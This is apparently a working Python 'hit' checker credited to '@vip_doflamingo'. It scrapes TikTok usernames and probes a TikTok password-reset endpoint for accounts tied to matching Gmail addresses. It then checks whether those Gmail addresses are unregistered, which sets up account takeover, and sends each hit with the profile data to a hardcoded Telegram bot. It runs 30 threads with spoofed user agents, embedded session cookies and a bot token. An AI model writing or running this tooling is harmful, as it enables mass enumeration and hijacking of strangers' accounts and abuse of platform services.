try:
	import requests,os,random
	from user_agent import generate_user_agent
	from uuid import uuid4
	import socket
	import webbrowser
	import datetime
	import threading
	import sys
	import json
except:
	os.system("pip install requsets")
	os.system("pip install names")
	os.system("pip install user_agent")
	os.system("pip install uid")
	os.system("pip install uuid")
	os.system("pip install webbrowser")
	os.system("pip install socket")
	os.system("pip install threading")
	os.system("pip install datetime")
	os.system("clear")
os.system('clear')

try:
 from cfonts import render, say
except:
 os.system('pip install python-cfonts')
output = render('O BOT', colors=['green', 'cyan'], align='center')
print(output)
#-------------------#
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
C = "\033[1;97m" 
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33'
#-------------------#

ID='2116409671'
tok='5815577992:AAHBy164Z1NvWLEZpVn7Y-fFPfEucqtX6ng'
hj=0
fc=0
hc=0
fj=0
vipDOFLAMINGO=999999999999999
re1 = {
'user-agent': generate_user_agent()}

def telegram(email):
	username=email.split('@gmail.com')[0]
	headers = {  'user-agent': generate_user_agent()}
	r = requests.get(f'''https://www.tiktok.com/@{username}''', headers=headers).text
	namee = r.split('"description" content="')[1].split('(')[0]
	fl = r.split('"followerCount":')[1].split(',')[0]
	nn0 = r.split('"id":"')[1].split('"')[0]
	fol = r.split('"followingCount":')[1].split(',')[0]
	nn3 = r.split('"region":"')[1].split('"')[0]
	likes = r.split('"heartCount":')[1].split(',')[0]
	tlg = f'''
⌯ Hi Qredes Got Hit
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
⌯ Name {namee}
⌯ User —> {username}
⌯ Email —> {email}
⌯ Follower -> {fl} × {fol} <- Following ⌯
⌯ likes —> {likes}
 PY : @vip_doflamingo
		'''
	print(F+tlg)
	requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text="+str(tlg))

def gmail(email):
	global fc,fj
	eml=str(email)
	email=eml.split('@')[0]+'@gmail.com'
	url = 'https://android.clients.google.com/setup/checkavail'
	h = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
	d = json.dumps({
		'username':email,
		'version':'3',
		'firstName':'AbaLahb',
		'lastName':'AbuJahl'
	})
	res = requests.post(url,data=d,headers=h)
	if res.json()['status'] == 'SUCCESS':
	   fj+=1
	   os.system('clear')
	   print(f'''
 {B} - {F}HITS : ⦃ {fj} ⦄    
 {B} - {Y}Good tiktok : ⦃ {hj} ⦄    
 {B} - {Z}Bad Gmail  : ⦃ {fc} ⦄ 
 {B} - {X}Bad tiktok  : ⦃ {hc} ⦄      
 {B} - {Y}Good Gmail : ⦃ {fj} ⦄     
 {B} - {Y}Email : ⦃ {email} ⦄     
''')
	   print(F+'DV '+Y+'BY '+E+'@vip_'+B+'DOFLAMINGO'+Z)
       
	   telegram(email)	    
	else:
	    fc+=1
	    os.system('clear')
	    print(f'''
 {B} - {F}HITS : ⦃ {fj} ⦄    
 {B} - {Y}Good tiktok : ⦃ {hj} ⦄    
 {B} - {Z}Bad Gmail  : ⦃ {fc} ⦄ 
 {B} - {X}Bad tiktok  : ⦃ {hc} ⦄      
 {B} - {Y}Good Gmail : ⦃ {fj} ⦄     
 {B} - {Y}Email : ⦃ {email} ⦄     
''')
	    print(F+'DV '+Y+'BY '+E+'@vip_'+B+'DOFLAMINGO'+Z)

	 
	 
def tiktok(email):
 global hc,hj
 email=str(email)
 url = f'https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1667149902064&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1667149902&as=a1261b755ea4d3e04e4388&cp=be4a3c6ce5e8520fe1MkUo&mas=0149d8edb9a3340aacd5c82fcadadde3801c1ccc2ca62c0ca6cc26'
 
 headers = {
'Host': 'api2-19-h2.musical.ly',
'Connection': 'keep-alive',
'Content-Length': '647',
'Cookie': 'odin_tt=b0db11ac4955afa4589bdb09d8f8fdcf3bcdea5238d0a6e2ba7c6aaea542e8d4ff9a3f324c153df80e03ac5e29a9d411925fa05d2f300713a2295db1eeff68accf50d5ddb5abd11115077fe989cfc094; store-idc=maliva; store-country-code=iq; store-country-code-src=did',
'Accept-Encoding': 'gzip',
'X-SS-QUERIES': 'dGMCAr6ot3awALq2qSjedy1Vk99nIoud%2BAhHSPAsj5dyUWFbxRx0wm95EoKwwNB3VVlOMd4SzMIENA51cwBS%2Bm0N1T95yguPVZ4OunAWAs0t0bHbsPclnVdl1Uh%2BLGZVXFGTew%3D%3D',
'sdk-version': '1',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'X-SS-TC': '0',
'User-Agent': 'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ_#u-nu-latn; ANY-LX2; Build/HONORANY-L22CQ; Cronet/58.0.2991.0)'
}


 data = (f'app_language=ar&manifest_version_code=2018101933&_rticket=1667150564079&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&email={email}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233')

 rr = requests.post(url, headers=headers, data=data).text

 if 'Sent successfully' in rr:
 	hj+=1
 	os.system('clear')
 	print(f'''
 {B} - {F}HITS : ⦃ {fj} ⦄    
 {B} - {Y}Good tiktok : ⦃ {hj} ⦄    
 {B} - {Z}Bad Gmail  : ⦃ {fc} ⦄ 
 {B} - {X}Bad tiktok  : ⦃ {hc} ⦄      
 {B} - {Y}Good Gmail : ⦃ {fj} ⦄     
 {B} - {Y}Email : ⦃ {email} ⦄     
''')
 	print(F+'DV '+Y+'BY '+E+'@vip_'+B+'DOFLAMINGO'+Z)
 	gmail(email)
 
 elif 'Bind device by email failed' in rr:
    os.system('clear')
    hc+=1
    print(f'''
 {B} - {F}HITS : ⦃ {fj} ⦄    
 {B} - {Y}Good tiktok : ⦃ {hj} ⦄    
 {B} - {Z}Bad Gmail  : ⦃ {fc} ⦄ 
 {B} - {X}Bad tiktok  : ⦃ {hc} ⦄      
 {B} - {Y}Good Gmail : ⦃ {fj} ⦄     
 {B} - {Y}Email : ⦃ {email} ⦄     
''')
    print(F+'DV '+Y+'BY '+E+'@vip_'+B+'DOFLAMINGO'+Z)
 else:
   hc+=1
   os.system('clear')
   print(f'''
 {B} - {F}HITS : ⦃ {fj} ⦄    
 {B} - {Y}Good tiktok : ⦃ {hj} ⦄    
 {B} - {Z}Bad Gmail  : ⦃ {fc} ⦄ 
 {B} - {X}Bad tiktok  : ⦃ {hc} ⦄      
 {B} - {Y}Good Gmail : ⦃ {fj} ⦄     
 {B} - {Y}Email : ⦃ {email} ⦄     
''')
   print(F+'DV '+Y+'BY '+E+'@vip_'+B+'DOFLAMINGO'+Z)

def ddd(user):
    import requests
    
    global lii,pp
    r = requests.get(f'https://www.tiktok.com/@{user}').text
    k = str(r.split('"UserModule":')[1]).split('"RecommendUserList"')[0]
    s = str(k.split('secUid":"')[1]).split('"')[0]
    id = str(k.split('"id":"')[1]).split('"')[0]
    url = 'https://www.tiktok.com/'
    headers = {'user-agent':"Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 Instagram 215.0.0.27.359 Android (31/12; 540dpi; 1080x2158; samsung; SM-G991B; o1s; exynos2100; fr_FR; 337202359)"}
    try:
      resp = requests.get(url,headers=headers).cookies.get_dict()
      tw = resp['ttwid']
      resp = requests.get(f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=en&app_name=tiktok_web&battery_info=0.95&browser_language=en-US&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36%20Edg%2F112.0.1722.58&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7167133500737406469&device_platform=web_pc&focus_state=true&from_page=search&history_len=12&is_fullscreen=false&is_page_visible=true&keyword={user}&os=windows&priority_region=&referer=&region=IQ&screen_height=864&screen_width=1536&tz_name=Asia%2FBaghdad&webcast_language=en&msToken=Jh2Un0eoRktVfI93pGX8cCnjRORmfpHcdVk3CX3iFej0oFwd4KkZbjtj4gVtMIcKhXsdNszAv59W5Hv4B1uqr4MEN1QLpDdyPbK0H_5XQxUIeebrnEz3m3lWx7RqYD-vYc_r2dD4dSnBoCz07w==&X-Bogus=DFSzswVLKvhANe8ktehWvBesEu3F&_signature=_02B4Z6wo00001nxbdaQAAIDD9Q7cROrxgA58W3EAAPti03',headers=headers)
      ms = resp.cookies.get_dict()['msToken']
    except:
      ddd(user)



    h = {
            'accept': '*/*',
            'accept-language':'ar-AE,ar-IQ;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6',
            'cookie':'passport_csrf_token=4228f3fbf31b6dfaf4355b13f9b0aab1; passport_csrf_token_default=4228f3fbf31b6dfaf4355b13f9b0aab1; tiktok_webapp_theme=dark; cookie-consent={%22_type_%22:%22default%22%2C%22user_unique_id%22:%227217131899898594822%22%2C%22timestamp%22:1680369484247}; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988={"user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"}; passport_auth_status=d744d8e40320dc7b2b6a801b88753868%2C; passport_auth_status_ss=d744d8e40320dc7b2b6a801b88753868%2C; tt_csrf_token=I2kMnWHq-aft0qqCZBHm2V9dJxK-PPB5Z7u0; tt_chain_token=TOnoLiClKRBqgEJqhjuKeQ==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFl1IY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=b149fa4aac395aa3f30217c6be371802%7C1690312955%7C15552000%7CSun%2C+21-Jan-2024+19%3A22%3A35+GMT; uid_tt=54bef809d5c02331a0d37bf327f4bc125935eee9590680e0a5e2ff4e780ea655; uid_tt_ss=54bef809d5c02331a0d37bf327f4bc125935eee9590680e0a5e2ff4e780ea655; sid_tt=b149fa4aac395aa3f30217c6be371802; sessionid=b149fa4aac395aa3f30217c6be371802; sessionid_ss=b149fa4aac395aa3f30217c6be371802; sid_ucp_v1==1.0.0-KDUzNDg2ZmIzMDJjMzA2OGRkOWJkYmM2OGNjZTkwYTZhMzE2YTRhZTMKIAiGiNS6qOTmqmEQ-8GApgYYswsgDDC-ttaKBjgBQOoHEAMaBm1hbGl2YSIgYjE0OWZhNGFhYzM5NWFhM2YzMDIxN2M2YmUzNzE4MDI; ssid_ucp_v1=1.0.0-KDUzNDg2ZmIzMDJjMzA2OGRkOWJkYmM2OGNjZTkwYTZhMzE2YTRhZTMKIAiGiNS6qOTmqmEQ-8GApgYYswsgDDC-ttaKBjgBQOoHEAMaBm1hbGl2YSIgYjE0OWZhNGFhYzM5NWFhM2YzMDIxN2M2YmUzNzE4MDI; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid='+tw+'; odin_tt=70015f10b12827e4d2b9cce32ead78da9bd1f5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken='+ms+'; msToken='+ms+'; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt',
            'referer': f'https://www.tiktok.com/@{user}?item_id={id}',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
    }
    rt = requests.get(f'https://www.tiktok.com/api/user/list/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.88&browser_language=ar-EG&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0%20%28Linux%3B%20Android%2010%3B%20Infinix%20X690B%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Mobile%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&count=200&device_id=7227896390197003781&device_platform=web_mobile&focus_state=true&from_page=user&history_len=6&is_fullscreen=false&is_page_visible=true&maxCursor=0&minCursor=0&os=android&priority_region=&referer=https%3A%2F%2Fwww.tiktok.com%2Flogin%3Fenter_from%3Dhomepage_hot%26lang%3Dar%26redirect_url%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fforyou%253Fitem_id%253D7216022215656262917&region=IQ&root_referer=https%3A%2F%2Fwww.google.com%2F&scene=21&screen_height=820&screen_width=360&secUid={s}&tz_name=Asia%2FBaghdad&verifyFp=verify_lh3ospm9_Reu7fKhn_mc4D_4qqD_BFQ3_dphns44cCPKG&webcast_language=ar',headers=h).json()['userList']
    g = 0
    for gt in rt:
        try:
            g+=1
            userrr=rt[g]['user']['uniqueId']
            email=userrr+'@gmail.com'
            tiktok(email)
           

             
        except:
            os.system('clear')
    
def loop():
  try:
    url = 'https://api.viewpals.co/api/v1/tiktok/users'
    user='qwertyuiopas.dfghjklzxcvbnm'
    num='456789'
    rng=int("".join(random.choice(num)for i in range(1)))
    nameee=str("".join(random.choice(user)for i in range(rng)))
    
    url = f"https://livecounts.xyz/api/tiktok-live-follower-count/search/{nameee}"
    response = requests.get(url).json()
    for i in response['results']:
        username = i['username']
        
        r = requests.get(f'''https://www.tiktok.com/@{username}''', headers=re1).text
        folo = r.split('"followingCount":')[1].split(',')[0]
        folo=int(folo)
        if folo > 199:
          ddd(username)
        else:
          continue
          
    loop()
  except:loop()


t=threading.Thread(target=loop)
r=threading.Thread(target=loop)
c=threading.Thread(target=loop)
h=threading.Thread(target=loop)
u=threading.Thread(target=loop)
b=threading.Thread(target=loop)
tt=threading.Thread(target=loop)
rr=threading.Thread(target=loop)
cc=threading.Thread(target=loop)
hh=threading.Thread(target=loop)
uu=threading.Thread(target=loop)
bb=threading.Thread(target=loop)
ttt=threading.Thread(target=loop)
rrr=threading.Thread(target=loop)
ccc=threading.Thread(target=loop)
hhh=threading.Thread(target=loop)
uuu=threading.Thread(target=loop)
bbb=threading.Thread(target=loop)
tttt=threading.Thread(target=loop)
rrrr=threading.Thread(target=loop)
cccc=threading.Thread(target=loop)
hhhh=threading.Thread(target=loop)
uuuu=threading.Thread(target=loop)
bbbb=threading.Thread(target=loop)
ttttt=threading.Thread(target=loop)
rrrrr=threading.Thread(target=loop)
ccccc=threading.Thread(target=loop)
hhhhh=threading.Thread(target=loop)
uuuuu=threading.Thread(target=loop)
bbbbb=threading.Thread(target=loop)
t.start()
r.start()
c.start()
h.start()
u.start()
b.start()
tt.start()
rr.start()
cc.start()
hh.start()
uu.start()
bb.start()
ttt.start()
rrr.start()
ccc.start()
hhh.start()
uuu.start()
bbb.start()
tttt.start()
rrrr.start()
cccc.start()
hhhh.start()
uuuu.start()
bbbb.start()
ttttt.start()
rrrrr.start()
ccccc.start()
hhhhh.start()
uuuuu.start()
bbbbb.start()
